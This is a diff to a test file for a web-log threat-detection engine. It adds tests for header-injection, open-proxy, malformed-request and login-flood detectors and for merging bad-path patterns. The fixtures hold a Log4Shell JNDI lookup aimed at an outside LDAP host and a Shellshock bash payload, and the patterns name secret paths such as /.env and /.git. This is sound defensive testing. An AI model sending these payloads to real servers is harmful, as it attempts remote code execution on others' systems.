@@ -3,7 +3,11 @@ import { Store } from "../src/store/store.js";
 import { Settings } from "../src/store/settings.js";
 import { Mailer } from "../src/threats/mailer.js";
 import { ThreatEngine } from "../src/threats/engine.js";
-import { DETECTOR_BY_ID, defaultConfig } from "../src/threats/detectors.js";
+import {
+  BASELINE_DEFAULT_PATTERNS,
+  DETECTOR_BY_ID,
+  defaultConfig,
+} from "../src/threats/detectors.js";
 import type { AccessEntry } from "../src/types.js";
 
 const NOW = Date.now();
@@ -91,6 +95,56 @@ describe("detectors", () => {
     const f = DETECTOR_BY_ID.get("hostScan")!.run(store.db, from, to, cfg.rules.hostScan!);
     expect(f[0]?.subject).toBe("198.51.100.13");
     expect(f[0]?.count).toBe(6);
+  });
+
+  it("headerInjection: flags payloads in the user agent or referer", () => {
+    store.insertAccessBatch([
+      entry({ userAgent: "${jndi:ldap://203.0.113.99/a}", client: "198.51.100.30" }),
+      entry({ referer: "() { :; }; /bin/bash -c id", client: "198.51.100.30" }),
+      // Ordinary browser traffic must not match.
+      entry({ client: "198.51.100.31", referer: "https://example.com/page?x=1" }),
+    ]);
+    const f = DETECTOR_BY_ID.get("headerInjection")!.run(
+      store.db, from, to, cfg.rules.headerInjection!,
+    );
+    expect(f).toHaveLength(1);
+    expect(f[0]?.subject).toBe("198.51.100.30");
+    expect(f[0]?.count).toBe(2);
+  });
+
+  it("openProxy: flags absolute-URL request lines", () => {
+    store.insertAccessBatch([
+      entry({ uri: "http://www.example.net/", client: "198.51.100.32" }),
+      entry({ uri: "/http://not-a-proxy-request", client: "198.51.100.33" }),
+    ]);
+    const f = DETECTOR_BY_ID.get("openProxy")!.run(store.db, from, to, cfg.rules.openProxy!);
+    expect(f).toHaveLength(1);
+    expect(f[0]?.subject).toBe("198.51.100.32");
+  });
+
+  it("malformedRequests: flags bursts of protocol errors", () => {
+    store.insertAccessBatch(
+      Array.from({ length: 10 }, (_, i) =>
+        entry({ status: i % 2 ? 400 : 497, client: "198.51.100.34" }),
+      ),
+    );
+    const f = DETECTOR_BY_ID.get("malformedRequests")!.run(
+      store.db, from, to, cfg.rules.malformedRequests!,
+    );
+    expect(f[0]?.subject).toBe("198.51.100.34");
+    expect(f[0]?.count).toBe(10);
+  });
+
+  it("loginFlood: flags many login POSTs but ignores GETs", () => {
+    const rows: AccessEntry[] = [];
+    for (let i = 0; i < 20; i++) {
+      rows.push(entry({ method: "POST", uri: "/api/auth/login", client: "198.51.100.35" }));
+      rows.push(entry({ method: "GET", uri: "/login", client: "198.51.100.36" }));
+    }
+    store.insertAccessBatch(rows);
+    const f = DETECTOR_BY_ID.get("loginFlood")!.run(store.db, from, to, cfg.rules.loginFlood!);
+    expect(f).toHaveLength(1);
+    expect(f[0]?.subject).toBe("198.51.100.35");
   });
 
   it("does not fire below threshold", () => {
@@ -204,6 +258,37 @@ describe("ThreatEngine", () => {
     );
     await engine.evaluate();
     expect(engine.listFindings({})).toHaveLength(0);
+  });
+
+  it("offers new default patterns to a saved config without restoring removed ones", () => {
+    // Own store: the shared engine has already recorded what it offered.
+    const legacyStore = new Store(":memory:");
+    const settings = new Settings(legacyStore.db);
+    // A config saved before pattern tracking existed: the user removed /.env.
+    const legacy = defaultConfig();
+    legacy.rules.badPaths!.patterns = BASELINE_DEFAULT_PATTERNS.badPaths!.filter(
+      (p) => p !== "%/.env%",
+    );
+    legacy.rules.badPaths!.patterns.push("%/my-custom%");
+    settings.setJSON("threat_config", legacy);
+
+    const mailer = new Mailer({ apiKey: "", from: "x@y.z" });
+    const load = () =>
+      new ThreatEngine(legacyStore.db, settings, mailer).getConfig().rules.badPaths!.patterns!;
+    let patterns = load();
+    expect(patterns).toContain("%/.git%");
+    expect(patterns).toContain("%/my-custom%");
+    expect(patterns).toContain("%/.svn%"); // newly offered
+    expect(patterns).not.toContain("%/.env%"); // stays removed
+
+    // The user then removes a newly offered pattern; a restart must not re-add it.
+    const cfg = settings.getJSON<typeof legacy>("threat_config")!;
+    cfg.rules.badPaths!.patterns = patterns.filter((p) => p !== "%/.svn%");
+    settings.setJSON("threat_config", cfg);
+    patterns = load();
+    expect(patterns).not.toContain("%/.svn%");
+    expect(patterns).not.toContain("%/.env%");
+    legacyStore.close();
   });
 
   it("merges saved config over defaults", () => {
